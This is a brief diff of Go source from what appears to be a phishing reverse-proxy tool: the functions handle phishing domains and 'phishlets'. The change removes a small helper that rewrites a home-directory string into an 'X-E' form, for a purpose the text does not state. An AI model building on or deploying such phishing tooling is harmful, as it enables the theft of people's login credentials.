@@ -1810,9 +1810,6 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
-func (p *HttpProxy) getHomeDir() string {
-	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
-}
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
